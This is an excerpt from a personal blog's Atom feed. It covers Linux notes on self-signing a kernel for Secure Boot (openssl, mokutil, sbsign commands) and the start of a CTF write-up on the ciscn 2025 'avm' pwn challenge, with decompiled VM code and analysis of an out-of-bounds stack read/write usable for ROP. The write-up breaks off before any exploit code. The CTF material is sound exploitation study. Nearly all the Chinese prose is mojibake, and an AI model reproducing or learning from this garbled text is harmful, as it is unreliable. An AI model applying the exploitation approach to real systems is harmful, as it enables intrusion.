¸6.3ç‰ˆæœ¬çš„æ—¶å€™æœ‰å¤§ä½¬è¯´è¿™ä¸ªé—®é¢˜å’Œä¸»æ¿æœ‰å…³ç³»ï¼Œæäº¤å†…æ ¸patchè¢«æ‹’ç»äº†è¯´è¿™ä¸ªé—®é¢˜å·²ç»åœ¨è§£å†³ï¼Œå¯æƒœç›®å‰è¿˜æ²¡æœ‰ï¼Œå‚è€ƒ<a href="https://bbs.deepin.org/post/249003">è¿™ç¯‡</a>ï¼ˆæ²¡ä»€ä¹ˆç”¨ï¼‰å’Œ<a href="https://github.com/xuwd1/lenovo-legion-slim7i-gen7-knowledges/wiki/%E8%A7%A3%E5%86%B3%E6%97%A0%E5%A4%96%E6%94%BE%E5%A3%B0%E9%9F%B3%E7%9A%84%E9%97%AE%E9%A2%98">è¿™ç¯‡</a>æ–‡ç« ã€‚</p><blockquote><p>å¦å¤–è¿˜èƒ½å°†è‡ªå·±çš„idåŠ åœ¨å†…æ ¸åé¢ï¼Œå¥½ç©ã€‚</p></blockquote><p>ç„¶åé€‰æ‹©çš„æœ€æ–°çš„6.8.1å†…æ ¸ã€‚è™½ç„¶æ˜¯å®˜æ–¹å‘å¸ƒçš„å†…æ ¸ä½†æ˜¯æ²¡æœ‰å‘è¡Œç‰ˆçš„ç­¾åï¼Œsecure bootè¿‡ä¸äº†ï¼Œwindowsç©ç“¦é‚£ä¸ªbåä½œå¼Šåˆè¦æ±‚å¼€secure bootå¾ˆçƒ¦ï¼Œæ‰€ä»¥åˆè¦è‡ªå·±å»ç­¾åå†…æ ¸ã€‚ç›´æ¥é—®äº†copilotåŠ ä¸Šè‡ªå·±æœç´¢ï¼Œæ‰§è¡Œä»¥ä¸‹å‡ æ¡å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">openssl req -new -x509 -newkey rsa:2048 -keyout MOK.priv -outform DER -out MOK.der -nodes -days 36500 -subj &quot;/CN=ZJ Secure Boot Signing Key/&quot;</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">å¯èƒ½ä¼šè¦æ±‚è¾“å…¥å¯†ç ï¼Œç­‰ä¸‹uefiå¯åŠ¨ä¼šç”¨</span></span><br><span class="line">sudo mokutil --import MOK.der</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">è¿™é‡Œè¦å…ˆå®‰è£…sbsignï¼Œaptå°±è¡Œ sudo apt install sbsigntool</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.der --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">æŠ¥é”™äº†ï¼Œé—®äº†copilotç„¶åå°†è¯ä¹¦æ”¹æˆ.pemæ ¼å¼ï¼š</span></span><br><span class="line">openssl x509 -in MOK.der -inform DER -out MOK.pem -outform PEM</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">é‡æ–°æ‰§è¡Œ</span></span><br><span class="line">sudo sbsign --key MOK.priv --cert MOK.pem --output /boot/vmlinuz-$(uname -r) /boot/vmlinuz-$(uname -r)</span><br></pre></td></tr></table></figure><p>é‡å¯å³å¯ï¼Œè¿™æ—¶å€™å°±å¯ä»¥æ‰“å¼€secure bootäº†ã€‚ä»linuxé‡å¯çš„æ—¶å€™ä¼šè¿›å…¥ä¸€ä¸ªå¼•å¯¼ç•Œé¢ï¼Œé€‰æ‹©enroll keyç„¶åè¾“å…¥å¯†ç å³å¯ã€‚ä½†æ˜¯ç¬¬ä¸€æ¬¡å¯åŠ¨guiç•Œé¢ç›´æ¥èŠ±å±äº†ï¼Œå“å¾—æˆ‘ä»¥ä¸ºæ˜¾å¡é©±åŠ¨æ¨¡å—ä¹Ÿè¦å•ç‹¬ç­¾åï¼Œç»“æœå†é‡å¯ä¸€æ¬¡ä¸€åˆ‡å°±æ­£å¸¸äº†ã€‚è¿™æ˜¯ä¸€ä¸ªæ²¡æœ‰ä»»ä½•å…³äºå¯†ç å­¦ã€è¯ä¹¦ã€ç­¾åã€éå¯¹ç§°åŠ å¯†ç»éªŒçš„äººæ‰‹åŠ¨ç­¾åå†…æ ¸çš„ç»å†ã€‚</p><h2 id="2024-6-2-Archå¯åŠ¨">2024.6.2 Archå¯åŠ¨</h2><p>deepinV20çš„glibcç‰ˆæœ¬å¤ªä½äº†å¾ˆéš¾å—ï¼Œå…ˆæ˜¯é‡è£…äº†ä¸€ä¸ªV23ï¼Œä½†æ˜¯æ•ˆæœä¸æ˜¯å¾ˆç†æƒ³ï¼Œä¸å¤ªå–œæ¬¢V23çš„UIé£æ ¼ï¼Œè€Œä¸”æµç•…åº¦è¿˜æœ‰ç¼ºé™·ã€‚çŠ¹è±«äº†ä¸€ä¸‹åŠ å…¥Archç¥æ•™ï¼Œå¥½åœ¨ç°åœ¨å·²ç»æœ‰archinstallçš„è„šæœ¬å¯ä»¥å¿«é€Ÿé…ç½®ã€‚ä¸å¾—ä¸è¯´KDE plasmaå°±æ˜¯æ¼‚äº®â€”â€”ä½†æ˜¯æ¶‰åŠæ˜¾ç¤ºé—®é¢˜å°±å¾ˆå¤šäº†ã€‚<br>å¤–æ¥å±å¹•ä¸å¥½ç”¨ï¼Œæ˜¾å¡åˆ‡æ¢çš„é—®é¢˜ï¼Œè‹±ä¼Ÿè¾¾å¯¹waylandä¸æ”¯æŒâ€¦å¤ªå²äº†ã€‚è¿˜æ˜¯å†³å®šä»¥åç”¨è¿™ä¸ªç³»ç»Ÿå°±integratedæ¨¡å¼ç®—äº†ï¼Œæµç•…åº¦ä»€ä¹ˆçš„ä¹Ÿå¾ˆé«˜ç”¨ç€å¾ˆèˆ’æœã€‚è¿˜éœ€è¦æŠŠå®‰è£…çš„è½¯ä»¶ä¼˜åŒ–ä¸€ä¸‹ç²¾ç®€ä¸€ä¸‹ä½“ç§¯ã€‚æ¯•ç«Ÿéƒ½ç”¨archäº†å¤šå°‘è¿˜æ˜¯å¾—æ´ç™–ä¸€ä¸‹ã€‚</p><p>å½»åº•æ”¾å¼ƒè‹±ä¼Ÿè¾¾ï¼Œnouveauæ¨¡å—å‘½åé»‘åå•äº†æ²¡è£…ï¼ŒæŒ‰ç…§å„ç§åŠæ³•åŒ…æ‹¬ä¸ä»å›¾å½¢ç•Œé¢å¯åŠ¨ä¹Ÿè°ƒäº†ä½†æ˜¯æ²¡ç”¨ï¼Œè‹±ä¼Ÿè¾¾é©±åŠ¨å¼€ä¸äº†ï¼Œåº”è¯¥æ˜¯pacmançš„é‚£ä¸ªç‰ˆæœ¬å¯èƒ½æ²¡æ³•è‡ªåŠ¨è£…è½½é©±åŠ¨ï¼Œå¯¼è‡´nå¡é»˜è®¤é©±åŠ¨ä¸€ç›´æ˜¯nouveauä½†æ˜¯æˆ‘åˆç¦ç”¨äº†å®ƒå°±ä¸€ç›´æ²¡æ³•è¾“å‡ºã€‚æ‡’å¾—æäº†</p><p>2024.8ä¸æ­»å¿ƒåˆæäº†ä¸€æ¬¡ï¼Œmkinitcpioåšå†…æ ¸é•œåƒç›´æ¥å°†nvidiaæŒ‚è½½ä¸Šï¼Œé©±åŠ¨æ˜¯è£…ä¸Šäº†æ˜¾å¡ä¹Ÿèƒ½ç”¨ï¼ˆåœ¨xorgä¸‹ï¼‰ä½†æ˜¯å¤–æ¥å±å¹•è¿˜æ˜¯æ²¡ç”¨ï¼Œè¿è¡Œä¸€ä¸‹nvidia-xconfigç›´æ¥å°†å›¾å½¢åŒ–å¹²æ²¡äº†ï¼Œè¯•äº†ç½‘ä¸Šçš„è§£å†³æ–¹æ³•éƒ½ä¸è¡Œï¼Œæœ€åç›´æ¥åˆ äº†xorg.confç„¶åé…ç½®sddm waylandå¯åŠ¨ æ»šå§</p><h2 id="2025-2">2025.2</h2><p>æœ€è¿‘è¯¾ç¨‹è®¾è®¡æ¯”è¾ƒè½»æ¾ï¼Œé‡æ–°æè¿™ä¸ªarchï¼Œé—²é±¼èŠ±äº†20è¿œç¨‹è£…äº†ä¸‹ï¼Œæœ€åå‘ç°æ˜¯nvidiaçš„é—­æºé©±åŠ¨å’Œå†…æ ¸ç‰ˆæœ¬å¼ºç»‘å®šï¼Œé•¿æ—¶é—´æ²¡æ»šå°±å¯„äº†ï¼Œè£…çš„æ—¶å€™è¿˜è¯´æˆ‘è¿™ä¾èµ–ä¹Ÿçƒ‚ã€‚ã€‚ã€‚é—®é¢˜ä¸€å †ä½†æ€»ç®—è£…ä¸Šäº†ï¼Œç„¶è€Œæˆ‘è‡ªå·±æŠ˜è…¾åŒæ˜¾å¡çš„æ—¶å€™ï¼Œç”¨äº†envycontrolï¼Œåˆ‡æ¢åˆ°é›†æ˜¾ä¸€å¼€æœºç›´æ¥èŠ±å±äº†ï¼Œlivecdè¯•ç€ä¿®äº†ä¸‹ä¹Ÿæ²¡åŠæ³•ï¼Œè€ƒè™‘åˆ°è£…çš„æ—¶å€™çš„é‚£ä¸€å †é—®é¢˜ï¼Œå¹²è„†æ¨å€’é‡æ¥ç®—äº†ã€‚</p><p>é‡è£…archåè€Œæ˜¯æœ€ç®€å•çš„ï¼Œè£…å¥½ä¹‹åç”¨btrfsæ–‡ä»¶ç³»ç»Ÿå›æ»šä¸è¦å¤ªçˆ½ï¼Œext4åƒå±å»å§ã€‚é‡è£…ä¹‹åç›´æ¥pacman nvidiaï¼Œæœ‰äº†å‰é¢è¸©å‘çš„ç»éªŒäºŒå‘¨ç›®é€Ÿé€šäº†ï¼Œé…ç½®å†…æ ¸å‚æ•°ä¼¼ä¹éƒ½ä¸ç”¨å°±èƒ½å¼€ï¼Ÿ</p><p>æ€»ä¹‹optimus managerä¹Ÿæ˜¯æä¸Šäº†ï¼Œè£…å¥½ä¹‹åç”µæºç­–ç•¥bbswitchä¸€é”™ç›´æ¥å›æ»šæˆ–è€…é‡è£…æ‡’å¾—bbã€‚æ•´ç†ä¸€ä¸ªæ–°çš„æ€»é›†ç¯‡å¥½å§</p><h2 id="2025-3">2025.3</h2><p>å› ä¸ºpatch c++libçš„æ—¶å€™åˆ·åˆ°å¸–å­ç›´æ¥copy libm.soåˆ°ç³»ç»Ÿè·¯å¾„ä¸‹åšæ›¿æ¢çš„æƒ³è¯•è¯•ï¼Œç»“æœç›´æ¥çƒ‚äº†ï¼Œå‘½ä»¤ç”¨ä¸äº†æ“ä½œåšä¸äº†ï¼Œå¼€æœºç›´æ¥è“å±ã€‚è¿™æ—¶å€™ç›´æ¥æ’ä¸Šå¯åŠ¨ç›˜æŠŠä¸»ç³»ç»ŸæŒ‚è½½ä¸Šæ”¹å›æ¥å°±è¡Œã€‚</p><h2 id="shellè„šæœ¬å­¦ä¹ ">shellè„šæœ¬å­¦ä¹ </h2><p>shellå£°æ˜ <code>#! /bin/bash</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è¿™ç¯‡æ–‡ç« å¯èƒ½éƒ½æ˜¯ä»€ä¹ˆä¹Ÿä¸æ‡‚çš„æ—¶å€™è®°å½•ä¸€äº›äº†è§£åˆ°çš„çŸ¥è¯†ï¼Œkernel pwnä¹Ÿä¼šæ”¾åœ¨linuxè¿™ä¸ªç±»ä¸‹ï¼Œå¯èƒ½ä»¥åå­¦äº†å†…æ ¸pwnä¼šæœ‰ä¸åŒçš„æ„Ÿå—å§ã€‚&lt;/p&gt;
&lt;h2 id=&quot;2023-11-26-linuxæ–‡ä»¶ç³»ç»Ÿæ ¹ç›®å½•ä¸‹é‚£äº›éƒ½æ˜¯å¹²ä»€ä¹ˆçš„ï¼Ÿ&quot;&gt;2023.11.26 linuxæ–‡ä»¶</summary>
      
    
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/categories/linux/"/>
    
    
    <category term="linux" scheme="https://zjw1nd.github.io/tags/linux/"/>
    
  </entry>
  
  <entry>
    <title>IDA-Better_printkæ¨å¹¿</title>
    <link href="https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/"/>
    <id>https://zjw1nd.github.io/2025/02/20/IDA-Better-printk%E6%8E%A8%E5%B9%BF/</id>
    <published>2025-02-20T14:22:10.000Z</published>
    <updated>2025-02-21T08:08:27.614Z</updated>
    
    
    
    
    <category term="Develop" scheme="https://zjw1nd.github.io/categories/Develop/"/>
    
    
    <category term="é€†å‘" scheme="https://zjw1nd.github.io/tags/%E9%80%86%E5%90%91/"/>
    
    <category term="Develop" scheme="https://zjw1nd.github.io/tags/Develop/"/>
    
  </entry>
  
  <entry>
    <title>ciscn_ccb2025åˆèµ›-avmé‡åšwp</title>
    <link href="https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/"/>
    <id>https://zjw1nd.github.io/2025/02/20/ciscn-ccb2025%E5%88%9D%E8%B5%9B-avm%E9%87%8D%E5%81%9Awp/</id>
    <published>2025-02-20T14:19:56.000Z</published>
    <updated>2025-02-21T08:01:11.163Z</updated>
    
    <content type="html"><![CDATA[<h1>é¢˜ç›®åˆ†æ</h1><h2 id="é€†å‘è™šæ‹Ÿæœºç»“æ„">é€†å‘è™šæ‹Ÿæœºç»“æ„</h2><p>è¿™é“é¢˜ç›®çš„è™šæ‹Ÿæœºè¿˜ç®—è§„æ•´ï¼Œä»mainå‡½æ•°å¼€å§‹çœ‹ï¼Œä»å¯¹è™šæ‹Ÿæœºåˆå§‹åŒ–çš„å‡½æ•°å…¥æ‰‹å¹¶ç»“åˆä»£ç æ‰§è¡Œçš„å‡½æ•°å¯ä»¥çœ‹å‡ºï¼Œæ•´ä½“çš„vmç»“æ„æ”¾åœ¨äº†bssï¼ŒåŒ…æ‹¬32ä¸ªé€šç”¨å¯„å­˜å™¨ï¼Œripï¼Œä»£ç æŒ‡é’ˆå’Œä»£ç å¤§å°ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">initvm</span><span class="params">(<span class="keyword">struct</span> vm *mem, __int64 code, <span class="type">unsigned</span> __int64 size)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+24h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  mem-&gt;CS_code_start = code;</span><br><span class="line">  mem-&gt;code_size = size;</span><br><span class="line">  result = mem;</span><br><span class="line">  mem-&gt;RIP = <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    result = mem;</span><br><span class="line">    mem-&gt;regs[i] = <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è™šæ‹Ÿæœºç»“æ„ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">00000000</span> <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> // <span class="title">sizeof</span>=</span><span class="number">0x118</span></span><br><span class="line"><span class="number">00000000</span> &#123;                                       <span class="comment">// XREF: .bss:vm/r</span></span><br><span class="line"><span class="number">00000000</span>     __int64 regs[<span class="number">32</span>];</span><br><span class="line"><span class="number">00000100</span>     __int64 RIP;</span><br><span class="line"><span class="number">00000108</span>     __int64 CS_code_start;</span><br><span class="line"><span class="number">00000110</span>     <span class="type">unsigned</span> __int64 code_size;</span><br><span class="line"><span class="number">00000118</span> &#125;;</span><br></pre></td></tr></table></figure><h2 id="é€†å‘æŒ‡ä»¤é›†">é€†å‘æŒ‡ä»¤é›†</h2><p>è¿™é‡Œå¤ç°çš„æ—¶å€™ä¹Ÿå¤´æ™•çš„ä¸è¡Œï¼Œæˆ‘ä»¬å…ˆçœ‹æ‰§è¡Œå‡½æ•°</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">execute</span><span class="params">(<span class="keyword">struct</span> vm *vm)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> insn; <span class="comment">// [rsp+1Ch] [rbp-114h]</span></span><br><span class="line">  _BYTE s[<span class="number">264</span>]; <span class="comment">// [rsp+20h] [rbp-110h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+128h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x100</span>uLL);</span><br><span class="line">  <span class="keyword">while</span> ( vm-&gt;RIP &lt; vm-&gt;code_size )</span><br><span class="line">  &#123;</span><br><span class="line">    insn = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL)) &gt;&gt; <span class="number">28</span>;<span class="comment">// ripæŒ‡é’ˆå››å­—èŠ‚å¯¹é½</span></span><br><span class="line">    <span class="keyword">if</span> ( insn &gt; <span class="number">0xA</span> || !insn )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Unsupported instruction&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">    &#125;</span><br><span class="line">    ((<span class="type">void</span> (__fastcall *)(<span class="keyword">struct</span> vm *, _BYTE *))funcs_1AAD[insn])(vm, s);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4 - __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œè™šæ‹ŸæœºæŒ‡ä»¤æœ€ç»ˆçš„æ‰§è¡Œæ˜¯å€ŸåŠ©ä¸€ä¸ªvtableå®ç°çš„ã€‚é€ä¸€åˆ†ævtableé‡Œçš„å‡½æ•°å°±èƒ½è¿˜åŸæŒ‡ä»¤çš„åŠŸèƒ½ï¼ŒåŒ…æ‹¬add,subç­‰å¸¸è§è¿ç®—ä¸ä¸¤ä¸ªå…³é”®çš„è®¿å­˜æŒ‡ä»¤æŒ‡ä»¤åŒ…å«ä¸‰ä¸ªæ“ä½œæ•°å’Œä¸€ä¸ªæ“ä½œç ã€‚æœ€é«˜4ä½æ˜¯æ“ä½œæ•°ï¼Œé™åˆ¶ä¸º0-10ï¼Œç”¨äºä¸‹æ ‡ç›´æ¥ä»vtableä¸­ç´¢å¼•æ“ä½œã€‚è€Œå…¶ä½™ä¸‰ä¸ªæ“ä½œæ•°å¯¹äºè¿ç®—æŒ‡ä»¤æ¥è¯´ï¼Œåˆ†ä¸ºæœ€ä½5ä½ï¼Œæ¬¡5ä½å’Œé«˜å­—çš„ä½5ä½ï¼ˆ16-20ï¼‰ã€‚ç”¨5ä½æ•°0-31æ¥åœ¨32ä¸ªé€šç”¨å¯„å­˜å™¨ä¸­ç´¢å¼•æ“ä½œï¼Œç¬¬ä¸€æ“ä½œæ•°ä¸º5-9ï¼Œç¬¬äºŒæ“ä½œæ•°ä½16-20ï¼Œç¬¬ä¸‰æ“ä½œæ•°ï¼ˆç»“æœå¯„å­˜å™¨ï¼‰ä¸º0-4.</p><blockquote><p>ps: è¿™é‡Œç»•äº†æˆ‘åŠå¤©ï¼Œæ¯æ¬¡çœ‹ç€çœ‹ç€å°±ä¸è®°å¾—å“ªä¸ªå‡å“ªä¸ªäº†ï¼Œä¹Ÿä¸ç¡®å®šè‡ªå·±å°è£…çš„å¯¹ä¸å¯¹â€¦</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">struct</span> vm *__fastcall <span class="title function_">sub</span><span class="params">(<span class="keyword">struct</span> vm *a1)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">vm</span> *<span class="title">result</span>;</span> <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v2 = *(_DWORD *)(a1-&gt;CS_code_start + (a1-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  a1-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = a1;</span><br><span class="line">  a1-&gt;regs[v2 &amp; <span class="number">0x1F</span>] = a1-&gt;regs[(v2 &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] - a1-&gt;regs[HIWORD(v2) &amp; <span class="number">0x1F</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œä¸¤ä¸ªè®¿å­˜æŒ‡ä»¤åˆ™æ¯”è¾ƒç‰¹åˆ«ï¼Œå¯¹äºloadï¼Œå…¶å¯ä»¥ä»ä¸€ä¸ªæŒ‡å®šåœ°å€åŠ è½½8å­—èŠ‚åˆ°ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨ã€‚è™šæ‹Ÿæœºè¿è¡ŒæŒ‡ä»¤æ—¶ä¼šåœ¨è°ƒç”¨æŒ‡ä»¤å‰çš„ä¸€ä¸ªå‡½æ•°å†…åˆ†é…ä¸€æ®µç©ºé—´å¹¶ä½œä¸ºå‚æ•°ä¼ å…¥ã€‚è¿™ä¸ªæŒ‡ä»¤ä¹Ÿæ˜¯ä¸‰ä¸ªæ“ä½œæ•°ï¼Œä¸åŒçš„æ˜¯ä¼šç”¨ä¸€ä¸ªå¯„å­˜å™¨åšåŸºåœ°å€ï¼Œé«˜å­—çš„ä½12ä½åšåç§»æ¥é’ˆå¯¹a2åšç´¢å¼•ï¼Œç„¶åç»“æœæ”¾å…¥ç»“æœå¯„å­˜å™¨ã€‚storeåˆ™ä¸å…¶ç›¸åï¼Œå‚æ•°è§„åˆ™ä¸€æ ·ï¼Œæ˜¯å°†ç»“æœå¯„å­˜å™¨å†…å®¹å­˜å…¥æŒ‡å®šåœ°å€ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> *__fastcall <span class="title function_">load</span><span class="params">(<span class="keyword">struct</span> vm *vm, <span class="type">char</span> *a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 v3; <span class="comment">// [rsp+1Eh] [rbp-22h]</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> cur_instruc; <span class="comment">// [rsp+20h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  cur_instruc = *(_DWORD *)(vm-&gt;CS_code_start + (vm-&gt;RIP &amp; <span class="number">0xFFFFFFFFFFFFFFFC</span>LL));</span><br><span class="line">  vm-&gt;RIP += <span class="number">4LL</span>;</span><br><span class="line">  result = (<span class="type">void</span> *)(<span class="type">unsigned</span> __int8)byte_4010;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="type">unsigned</span> __int8)(vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + BYTE2(cur_instruc)) &lt; (<span class="type">unsigned</span> __int8)byte_4010 )</span><br><span class="line">  &#123;</span><br><span class="line">    result = vm;</span><br><span class="line">    v3 = vm-&gt;regs[(cur_instruc &gt;&gt; <span class="number">5</span>) &amp; <span class="number">0x1F</span>] + (HIWORD(cur_instruc) &amp; <span class="number">0xFFF</span>);</span><br><span class="line">    vm-&gt;regs[cur_instruc &amp; <span class="number">0x1F</span>] = ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">7</span>] &lt;&lt; <span class="number">56</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">6</span>] &lt;&lt; <span class="number">48</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">5</span>] &lt;&lt; <span class="number">40</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">4</span>] &lt;&lt; <span class="number">32</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">3</span>] &lt;&lt; <span class="number">24</span>) | ((<span class="type">unsigned</span> __int64)(<span class="type">unsigned</span> __int8)a2[v3 + <span class="number">2</span>] &lt;&lt; <span class="number">16</span>) | *(<span class="type">unsigned</span> __int16 *)&amp;a2[v3];</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>æ¼æ´åˆ†æ</h1><p>æ˜¾ç„¶ï¼Œè®¿å­˜æŒ‡ä»¤çš„æƒé™å¤ªå¤§äº†ã€‚è¿™ä¸ªæŒ‡ä»¤é‡Œçš„åç§»èƒ½ç´¢å¼•0xfffï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬èƒ½å¤Ÿåœ¨ä¸€ä¸ªç›¸å½“å¤§èŒƒå›´çš„æ ˆä¸Šä»»æ„è¯»å†™ã€‚æ„é€ ROPæˆ–è€…ç›´æ¥ret2ogéƒ½æ˜¯å¯ä»¥çš„ã€‚ä¸è¿‡è¿™é“é¢˜çš„éš¾ç‚¹æ˜¯ï¼Œä»–æ²¡æœ‰æ³„éœ²ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±å»å‡‘libcåœ°å€ï¼Œæ‰€ä»¥ä»æ ˆä¸Šæƒ³åŠæ³•æ‰¾ä¸€ä¸ªâ€œå¥½â€çš„åœ°å€å°±æˆä¸ºäº†æœ¬é¢˜çš„å…³é”®ã€‚ä½†æ¯”è¾ƒæ¶å¿ƒçš„æ˜¯ï¼Œå¯èƒ½ç”±äºaslrçš„å­˜åœ¨ï¼Œæ ˆå†…éƒ¨çš„åç§»è®¸å¤šéƒ½æ˜¯ä¸å›ºå®šçš„ï¼Œå› æ­¤è¿™é“é¢˜è®©æˆ‘æŒæ¡äº†ä¸€ä¸ªå¾ˆå®è´µçš„ç»éªŒï¼Œä¹Ÿå°±æ˜¯<strong>åˆç†ä½¿ç”¨search+distanceæŒ‡ä»¤ç»„åˆæ‹³</strong>ã€‚</p><blockquote><p>å¦å¤–æœ‰ä¸€ä¸ªç®€å•çš„ç‚¹ï¼Œç”±äº0xfffå®åœ¨å¤ªå¤§äº†ï¼Œæˆ‘ä»¬å¯ä»¥loadå’Œstoreæˆ‘ä»¬è¾“å…¥çš„codeå†…å®¹ï¼Œä¹Ÿå°±æ˜¯è¯´åŸºæœ¬æ˜¯ç›´çƒçš„æ ˆä¸Šä»»æ„åœ°å€è¯»å†™ã€‚</p></blockquote><h2 id="pwndbgå¥½ç”¨æ">pwndbgå¥½ç”¨æ</h2><p>pwndbgä¸ºæˆ‘ä»¬æä¾›äº†è½®æ¤…ä¸ºä»€ä¹ˆä¸ç”¨ï¼Ÿè°ƒè¯•è¿‡ç¨‹ä¸­ä¼šä»¥è¿”å›åœ°å€å½¢å¼æ˜¾ç¤ºå‡½æ•°è°ƒç”¨å †æ 